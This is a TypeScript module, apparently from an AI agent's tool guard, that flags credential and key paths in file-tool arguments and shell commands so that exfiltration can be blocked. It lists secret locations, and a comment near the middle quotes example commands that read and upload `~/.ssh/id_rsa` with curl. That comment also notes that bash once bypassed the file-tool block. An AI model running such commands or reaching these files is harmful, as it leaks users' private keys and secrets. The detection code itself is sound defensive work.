// sensitive-path.ts
//
// Sensitive-file path detection for tool-call argument auditing.
// Responsibilities:
//   - isSensitivePath(path): pure function, returns true when a path
//     references a sensitive credential / key / secret location so the
//     caller (e.g. a tool wrapper or guard) can block exfiltration.
//
// Design notes:
//   - Zero dependencies — only Node's `path` module for basename extraction.
//   - All string comparisons are case-insensitive (via toLowerCase()).
//   - Both `/` and `\` separators are supported: we normalize to `/` before
//     suffix/contains checks so Windows paths are handled uniformly.

import { basename } from 'node:path'

/** Normalize a path for comparison: lower-case and convert `\` to `/`. */
function comparable(path: string): string {
  return path.toLowerCase().replace(/\\/g, '/')
}

/** Normalize a basename for comparison: lower-case only (no separators). */
function comparableBasename(name: string): string {
  return name.toLowerCase()
}

// --- .env rules -----------------------------------------------------------

const ENV_EXEMPTIONS = new Set<string>([
  '.env.example',
  '.env.sample',
  '.env.template',
  '.env.dist',
  '.env.defaults',
])

const ENV_PREFIX = '.env.'

// --- ssh key basenames ----------------------------------------------------

const SENSITIVE_BASENAMES = new Set<string>([
  '.env',
  'id_rsa',
  'id_ed25519',
  'id_ecdsa',
  'id_dsa',
  'credentials',
  '.netrc',
  '.git-credentials',
  '.npmrc',
  '.pypirc',
])

/** Basename prefixes whose renamed variants (id_rsa.bak, id_rsa-old) are also sensitive. */
const SENSITIVE_BASENAME_PREFIXES = [
  'id_rsa',
  'id_ed25519',
  'id_ecdsa',
  'id_dsa',
  'credentials',
]

/** Public-key basenames are always exempt even when they share the prefix. */
const PUBLIC_KEY_EXEMPTIONS = new Set<string>([
  'id_rsa.pub',
  'id_ed25519.pub',
  'id_ecdsa.pub',
  'id_dsa.pub',
])

/**
 * Recognised dot-suffix variants of sensitive key basenames.
 * E.g. `id_rsa.bak`, `id_rsa.old`, `id_rsa.pem`.
 */
const SENSITIVE_DOT_VARIANT_SUFFIXES = new Set<string>([
  '.bak',
  '.backup',
  '.copy',
  '.disabled',
  '.key',
  '.old',
  '.orig',
  '.pem',
  '.save',
  '.tmp',
])

// --- path-suffix rules ----------------------------------------------------

/**
 * Sensitive path segments expressed as `[dir, file]` pairs joined by `/`.
 * Matches when the comparable path ends with `/<dir>/<file>` or contains
 * `/<dir>/<file>/`.
 */
const SENSITIVE_PATH_SUFFIXES: ReadonlyArray<readonly [string, string]> = [
  ['.aws', 'credentials'],
  ['.gcp', 'credentials'],
]

/**
 * Directory names that mark any path passing through them as sensitive.
 * Matched as `/<dir>/` (with leading separator so `my.ssh/foo` is not flagged).
 */
const SENSITIVE_DIR_SEGMENTS = new Set<string>([
  '.ssh',
  '.gnupg',
  '.kube',
  '.aws',
  '.gcp',
  'secrets',
])

// --- extension rules ------------------------------------------------------

/**
 * Sensitive certificate / key extensions. Matched against the basename.
 */
const SENSITIVE_EXTENSIONS = new Set<string>([
  '.pem',
  '.p12',
  '.pfx',
  '.key',
  '.der',
  '.crt',
  '.cer',
])

/**
 * Return the lowercase extension of a basename (including the leading dot),
 * or '' if there is none. Uses the last dot so multi-dotted names are handled.
 */
function lowerExtension(name: string): string {
  const dot = name.lastIndexOf('.')
  if (dot <= 0) return '' // dot at index 0 → hidden file like `.env`, not an ext
  return name.slice(dot).toLowerCase()
}

// --- public API -----------------------------------------------------------

/**
 * Detect whether a file path references a sensitive location.
 *
 * Detection rules (case-insensitive):
 * - `.env` (but NOT `.env.example`, `.env.sample`, `.env.template`, `.env.dist`,
 *   `.env.defaults`)
 * - `.env.*` variants like `.env.local`, `.env.production`
 * - `id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa` (and variants like
 *   `id_rsa.bak`, `id_rsa.old`, `id_rsa.pem`) — public keys (`.pub`) are exempt
 * - `.aws/credentials`, `.gcp/credentials`
 * - any path containing `/.ssh/` (or ending in `/.ssh`)
 * - `.gnupg/`, `.kube/`, `secrets/`
 * - `.pem`, `.p12`, `.pfx`, `.key`, `.der`, `.crt`, `.cer` extensions
 * - `credentials` (exact basename only — NOT `credentials.json`)
 * - `.netrc`, `.git-credentials`, `.npmrc`, `.pypirc`
 *
 * Returns `true` if the path is sensitive.
 */
export function isSensitivePath(path: string): boolean {
  if (typeof path !== 'string' || path.length === 0) return false

  const name = basename(path)
  const cname = comparableBasename(name)
  const cpath = comparable(path)

  // 1. Exemptions first — these win over everything else.
  if (ENV_EXEMPTIONS.has(cname)) return false
  if (PUBLIC_KEY_EXEMPTIONS.has(cname)) return false

  // 2. Exact-basename match (`.env`, `id_rsa`, `credentials`, `.netrc`, ...).
  if (SENSITIVE_BASENAMES.has(cname)) return true

  // 3. `.env.*` variants (`.env.local`, `.env.production`, ...).
  //    Exemptions already handled above; any remaining `.env.<x>` is sensitive.
  if (cname.startsWith(ENV_PREFIX)) return true

  // 4. Basename-prefix variants: `id_rsa.bak`, `id_rsa-old`, `id_rsa_old`.
  //    Reject `id_rsafoo` (suffix is not a separator/dot-variant).
  for (const prefix of SENSITIVE_BASENAME_PREFIXES) {
    if (cname === prefix) return true // already covered by step 2, kept for clarity
    if (cname.length > prefix.length && cname.startsWith(prefix)) {
      const suffix = cname.slice(prefix.length)
      const next = suffix[0]
      // `-` / `_` separators → sensitive (e.g. id_rsa-backup, credentials_old).
      if (next === '-' || next === '_') return true
      // `.` followed by a known dot-variant suffix → sensitive (e.g. id_rsa.bak).
      if (next === '.' && SENSITIVE_DOT_VARIANT_SUFFIXES.has(suffix)) return true
    }
  }

  // 5. Path-suffix rules: `.aws/credentials`, `.gcp/credentials`.
  for (const [dir, file] of SENSITIVE_PATH_SUFFIXES) {
    const seg = `${dir}/${file}`
    if (cpath.endsWith('/' + seg) || cpath.includes('/' + seg + '/')) return true
  }

  // 6. Sensitive directory segments: `.ssh`, `.gnupg`, `.kube`, `secrets`.
  //    Match `/<dir>/` or path ending in `/<dir>`.
  const parts = cpath.split('/')
  for (const p of parts) {
    if (SENSITIVE_DIR_SEGMENTS.has(p)) return true
  }

  // 7. Certificate / key extensions: `.pem`, `.p12`, `.pfx`, `.key`, ...
  const ext = lowerExtension(name)
  if (ext !== '' && SENSITIVE_EXTENSIONS.has(ext)) return true

  return false
}

// --- shell-command extraction (v0.35.2) -----------------------------------
//
// The file tools (read / ls / find / grep) carry a `path` argument, so the
// sensitive-path door checks them directly. The shell tools carry a `command`
// string instead — without this extraction the SAME file is hard-refused via
// `read` and freely readable via `bash` (`cat ~/.ssh/id_rsa`,
// `curl -F file=@~/.ssh/id_rsa http://…`). This closes that asymmetry.
//
// Deliberately conservative: only tokens that look like paths are examined, so
// ordinary commands (`npm run build`, `git status`) are untouched. This is the
// same function `read` goes through, so shell and file tools have exactly the
// same sensitive-path coverage — no second rule set to drift.

/** Split a command line into raw tokens on whitespace and shell metacharacters. */
function shellTokens(command: string): string[] {
  return command.split(/[\s|&;()<>`]+/).filter(t => t.length > 0)
}

/**
 * Candidate paths carried by one raw token: the token itself, plus the value
 * side of `--flag=value` and the target side of `file=@path` / `@path` forms.
 */
function tokenPathCandidates(token: string): string[] {
  const cleaned = token.replace(/^["']+|["']+$/g, '')
  const out = [cleaned]
  const eq = cleaned.indexOf('=')
  if (eq !== -1 && eq + 1 < cleaned.length) out.push(cleaned.slice(eq + 1))
  const at = cleaned.lastIndexOf('@')
  if (at !== -1 && at + 1 < cleaned.length) out.push(cleaned.slice(at + 1))
  return out.filter(c => c.length > 0 && !c.startsWith('-'))
}

/**
 * Return the first path in a shell command that `isSensitivePath` flags, or
 * `null` when the command references none. URLs are skipped (a URL path is not
 * a local file), and tokens are checked individually so no path is missed just
 * because it is wrapped in quotes or written as `--flag=path`.
 */
export function findSensitiveShellPath(command: string): string | null {
  if (typeof command !== 'string' || command.length === 0) return null
  for (const token of shellTokens(command)) {
    for (const candidate of tokenPathCandidates(token)) {
      if (candidate.includes('://')) continue // URL, not a local path
      if (isSensitivePath(candidate)) return candidate
    }
  }
  return null
}

/**
 * v0.36: all local-path-like candidates in a shell command (superset of the
 * sensitive check — file-history uses it to decide what to snapshot before a
 * destructive shell command runs). Skips URLs and unresolvable tokens
 * (variable / command substitution); the CALLER decides path-likeness
 * (extension / existence checks) — this function only does token extraction,
 * exactly the same splitting as `findSensitiveShellPath` (parity by
 * construction, same rationale as v0.35.2).
 */
export function extractShellPathCandidates(command: string): string[] {
  if (typeof command !== 'string' || command.length === 0) return []
  const out: string[] = []
  for (const token of shellTokens(command)) {
    for (const candidate of tokenPathCandidates(token)) {
      if (candidate.includes('://')) continue // URL, not a local path
      if (candidate.includes('$') || candidate.includes('`')) continue // unresolvable at snapshot time
      out.push(candidate)
    }
  }
  return out
}
